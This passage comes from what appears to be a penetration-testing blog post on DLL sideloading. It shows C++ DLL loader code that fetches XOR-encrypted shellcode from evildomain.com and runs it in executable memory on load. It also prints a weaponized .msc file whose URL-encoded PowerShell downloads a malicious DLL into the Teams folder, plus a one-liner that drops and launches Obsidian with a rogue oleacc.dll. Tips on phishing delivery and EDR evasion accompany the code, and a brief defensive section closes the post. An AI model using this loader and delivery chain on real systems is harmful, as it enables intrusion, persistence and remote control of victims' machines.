0, WINHTTP\_NO\_REQUEST\_DATA,0,

0,0);

// End the request.

if(bResults)

bResults =WinHttpReceiveResponse(hRequest,NULL);

// Keep checking for data until there is nothing left.

if(bResults)

{

do

{

// Check for available data.

dwSize =0;

if(!WinHttpQueryDataAvailable(hRequest,& dwSize))

{

printf("Error %u in WinHttpQueryDataAvailable.\\n",

GetLastError());

break;

}

// No more available data.

if(!dwSize)

break;

// Allocate space for the buffer.

pszOutBuffer =newchar\[dwSize +1\];

if(!pszOutBuffer)

{

printf("Out of memory\\n");

break;

}

// Read the Data.

ZeroMemory(pszOutBuffer, dwSize +1);

if(!WinHttpReadData(hRequest,(LPVOID) pszOutBuffer,

dwSize,& dwDownloaded))

{

printf("Error %u in WinHttpReadData.\\n",GetLastError());

}else

{

int i =0;

while(i < dwSize)

{

// Since the cunks are transferred in 8192 bytes, this check is required for larger buffers

if(counter >=sizeof(buf))

{

break;

}

memcpy(&buf\[counter\],&pszOutBuffer\[i\],sizeof(char));

counter++;

i++;

}

}

delete\[\] pszOutBuffer;

if(!dwDownloaded)

break;

}while(dwSize >0);

}else

{

// Report any errors.

printf("Error %d has occurred.\\n",GetLastError());

}

printf("\[+\] %d Bytes successfully written!\\n",sizeof(buf));

// Close any open handles.

if(hRequest)WinHttpCloseHandle(hRequest);

if(hConnect)WinHttpCloseHandle(hConnect);

if(hSession)WinHttpCloseHandle(hSession);

}

voidx(char\*payload,intpayload\_length,char\*key,intlength){

int j =0;

for(int i =0; i < payload\_length -1; i++){

if(j == length -1) j =0;

payload\[i\]^=key\[j\];

unsignedchar data =payload\[i\]^key\[j\];

j++;

}

}

VOIDrun()

{

Sleep(3000);

dl(L "evildomain.com",(short)8443);

char key\[\] ="e001ffbe97fc842aeb4a91161f6291f1";

LPVOID address = ::VirtualAlloc(NULL,sizeof(buf), MEM\_RESERVE \| MEM\_COMMIT, PAGE\_EXECUTE\_READWRITE);

x((char\*) buf,sizeof(buf), key,sizeof(key));

std::memcpy(address, buf,sizeof(buf));

Sleep(5000);

((void(\*)()) address)();

}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul\_reason\_for\_call, LPVOID lpReserved)

{

HANDLE hThread =NULL;

switch(ul\_reason\_for\_call)

{

case DLL\_PROCESS\_ATTACH:

hThread =CreateThread(NULL,0,(LPTHREAD\_START\_ROUTINE) run,NULL,0,NULL);

break;

case DLL\_THREAD\_ATTACH:

break;

case DLL\_THREAD\_DETACH:

break;

case DLL\_PROCESS\_DETACH:

break;

break;

}

return TRUE;

}

After the DLL file is compiled and placed on the writable path, we can now execute the DVTA application once again.

![](https://www.r-tec.net/files/content/img/News%2BEvents/Blog_DLL-Sideloading/Bild-10-DVTA-20240523164742.webp)

Figure 2: DVTA running normally with the new cryptbase.dll

The enc.bin file should of course be hosted on controlled web server during the attack, otherwise this POC won’t work.

When this newly created DLL is placed inside the `c:\Users\user\AppData\Local\Microsoft\Teams\current`\ folder, Teams will load it on next startup. And now the question is HOW to transfer it? The most obvious answer is of course from phishing attack aiming to obtain initial access and establish persistence. However, transferring a DLL file over email as attachment is not a smart thing to do and will also get blocked by the outlook client.

The answer to this problem is not straight forward as there are countless ways and tricks into performing this attack. Some examples may include transferring a legit signed binary with a sideloading DLL in a ZIParchive. But there are dozens of attachment types possibly being used for initial access payloads ranging from MSI/ClickOnce installer files over Scripting files (SCT, JS, …) Shortcut Files (LNK, URL, …) and much more.

The aim of this blog is however not to show initial access payload types, so we go for one recently published example only.

On 21th of June, [elastic](https://x.com/dez_/status/1804211936311284209 "Tweet from elastic") published a new initial access vector for command execution via specially crafted .msc files. We could simply modify this initial PoC to execute a Powershell oneliner, which downloads out DLL from a remote webserver into the target writable `%APPDATA%` location.

XML

<?xml version="1.0"?>

<MMC\_ConsoleFileConsoleVersion="3.0"ProgramMode="UserSDI">

<ConsoleFileID>a7bf8102-12e1-4226-aa6a-2ba71f6249d0</ConsoleFileID>

\[…snip…\]

<StringTable>

<GUID>{71E5B33E-1064-11D2-808F-0000F875A9CE}</GUID>

<Strings>

<StringID="1"Refs="1">Favorites</String>

<StringID="8"Refs="2">// Console Root

// &#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&

var scopeNamespace = external.Document.ScopeNamespace;

var rootNode = scopeNamespace.GetRoot()

var mainNode = scopeNamespace.GetChild(rootNode)

var docNode = scopeNamespace.GetNext(mainNode)

external.Document.ActiveView.ActiveScopeNode = docNode

docObject = external.Document.ActiveView.ControlObject

external.Document.ActiveView.ActiveScopeNode = mainNode

var XML = docObject;

XML.async = false

var xsl = XML;

xsl.loadXML(unescape("%3C%3Fxml%20version%3D%271%2E0%27%3F%3E%0D%0A%3Cstylesheet%0D%0A%20%20%20%20xmlns%3D%22 http%3A%2F%2Fwww%2Ew3%2Eorg%2F1999%2FXSL%2FTransform%22%20xmlns%3Ams%3D%22urn%3Aschemas%2Dmicrosoft%2Dcom%3Axslt %22%0D%0A%20%20%20%20xmlns%3Auser%3D%22placeholder%22%0D%0A%20%20%20%20version%3D%221%2E0%22%3E%0D%0A%20%20%20 %20%3Coutput%20method%3D%22text%22%2F%3E%0D%0A%20%20%20%20%3Cms%3Ascript%20implements%2Dprefix%3D%22user%22%20 language%3D%22VBScript%22%3E%0D%0A%09%3C%21%5BCDATA%5B%0D%0ASet%20wshshell%20%3D%20CreateObject%28%22WScript %2EShell%22%29%0D%0AWshshell%2Erun%20%22powershell%20-w%20hidden%20Invoke-WebRequest%20-Uri%20https%3A%2F%2Fevildomain.com%2FAudioSes.dll%20-OutFile%20%24env%3ALOCALAPPDATA%5CMicrosoft%5CTeams%5Ccurrent%5CAudioSes.dll%20-UseBasicParsing%22%0D%0A%5D%5D%3E%3C%2Fms%3Ascript%3E%0D%0A%3C%2Fstylesheet%3E"))

XML.transformNode(xsl)

</String>

<StringID="23"Refs="2">Document</String>

<StringID="24"Refs="1">{2933BF90-7B36-11D2-B20E-00C04F983E60}</String>

<StringID="38"Refs="2">Main</String>

<StringID="39"Refs="1">res://apds.dll/redirect.html?target=javascript:eval(external.Document.ScopeNamespace.GetRoot().Name)</String>

</Strings>

</StringTable>

</StringTables>

<BinaryStorage>

\[…snip…\]

<SNIPPED CODE>

The interesting part is the execution of Powershell in the URL-encoded payload section , which downloads the DLL from a remote webserver into `%APPDATA%`.

_Keep in mind that no matter which payload you use, always url encode it before action, otherwise it will simply corrupt the MSC file._

To make the things even better, the .msc payload could also be adjusted in terms of a pre-checking if Teams is running or not. If there is no Teams on the target system, we’re using an alternative payload. Let’s extend the logic a little bit now.

Powershell -w hiddenif(Get-Process-Name Teams -ErrorAction SilentlyContinue){curl.exe https://evildomain.com/AudioSes.dll -k -o $env:LOCALAPPDATA\\Microsoft\\Teams\\current\\AudioSes.dll }else{curl.exe https://evildomain.com/Obsidian.zip -k -o C:\\Windows\\Tasks\\Obsidian.zip;Expand-Archive-Path C:\\Windows\\Tasks\\Obsidian.zip -DestinationPath C:\\Windows\\Tasks -Force; C:\\Windows\\Tasks\obsidian.exe}

In this case, the first part of the snippet will check the running processes for an Teams instance running. If so, it will simply drop the DLL, which will complete the sideloading attack and establish persistence. On the other hand side, if Teams is missing, the code will download a ZIP archive with known and signed binary, in this example – Obsidian. The archive also contains the precompiled malicious DLL with the name of `oleacc.dll`.

_The oleacc.dll has the same functionality as AudioSes.dll and was generated with Spartacus, by following the same process as above._

After extraction, obsidian.exe will be executed and then the DLL will be loaded.

The next part is to transfer the .msc file in an archive (as plain .msc is also blocked for download by outlook) or via Phishing Link as download from a remote webserver (no Mark of the Web), and upon execution, we should be able to receive a C2 callback in each of the cases.

### Case 1: Teams

Executing test.msc automatically downloads AudioSes.dll to the needed location.

![Screenshot msc execution leads to file drop & persistence](https://www.r-tec.net/files/content/img/News%2BEvents/Blog_DLL-Sideloading/Bild-16-msc-exe-20240729113025.webp)

Figure 16: msc execution leads to file drop & persistence

Next time teams starts, the enc.bin file is remotely fetched and C2 connection get’s established.

![Screenshot DLL && encrypted payload getting downloaded](https://www.r-tec.net/files/content/img/News%2BEvents/Blog_DLL-Sideloading/Bild-17-dll-download-20240729113052.webp)

Figure 17: DLL && encrypted payload getting downloaded

![Screenshot C2 connection established via Teams](https://www.r-tec.net/files/content/img/News%2BEvents/Blog_DLL-Sideloading/Bild-18-c2-connect-20240729113115.webp)

Figure 18: C2 connection established via Teams

### Case 2: Obsidian

Here, test.msc is executed when Teams is not running, which downloads and extracts Obsidian.zip into `C:\Windows\Tasks\`.

Using Obsidian for initial access in a real world environment would however be highly suspicious, as Obsidian won’t start in hidden mode but be visible for the target user, which might also just close the process killing your C2-connection. But this example can be replaced with any other Sideloading binary.

![Screenshot Archive extracted && Obsidian started](https://www.r-tec.net/files/content/img/News%2BEvents/Blog_DLL-Sideloading/Bild-19-archive-obsidian-20240729113200.webp)

Figure 19: Archive extracted && Obsidian started

![Screenshot C2 connection via Obsidian.exe](https://www.r-tec.net/files/content/img/News%2BEvents/Blog_DLL-Sideloading/Bild-20-c2-connect-obsidian-20240729113230.webp)

Figure 20: C2 connection via Obsidian.exe

## 9\. Conclusion

We went through explanations about DLLs in general, how the DLL Sideloading attack works and some ideas for initial access and weaponization. You may now understand what DLL Hijacking and DLL Sideloading is about and how to forward DLL exports.

The process of finding binaries vulnerable to DLL Sideloading, as well as weaponization of those in terms of shellcode execution with basic and minimum needed evasion was shown.

One of the coolest parts about sideloading is its evasive nature, especially for EDRs. Living in a legitimate signed and often used binary will lead to more trust for our process and less detections. Especially, if our target process is doing similar activities to our beacon like HTTPS communication in regular intervals, we masquerade this IoC inside of our trusted process. Using an unsigned exectable, which is not known to be used in company environments (cloud metadata) will likely already lead to an alert/detection, so sticking to at least DLLs or better Sideloading is a must nowadays.

Of course, the DLL payload itself should be as evasive as possible because, no matter how evasive the sideloading technique is, you cannot expect great results if you for example embed the plaintext payload into the source code, just as I did in the first demo. Once more, remember that every component of your attack chain needs to be taken care of because the attack likely fails if just one of them is not.

As defenders, it's crucial to adopt a multi-layered approach to mitigate this risk effectively.

One of the primary strategies involves implementing Application Whitelisting to ensure only approved binaries can execute. By tightly controlling what runs in your environment, you significantly reduce the attack surface.

Custom detection rules for known Windows DLLs being loaded from non Windows path’s such as System32 could also be used to identify DLL Sideloading attacks. Doing this for non Windows DLLs however is not that easy, as there are too many different vendors and binaries/DLLs to track all of them.

It is imperative to prioritize user awareness and education. After all, the MSC file from this blogpost must be first delivered to the victim system before it is executed. When paired with strong endpoint security solutions, the chances to identify and stop malicious activities are higher.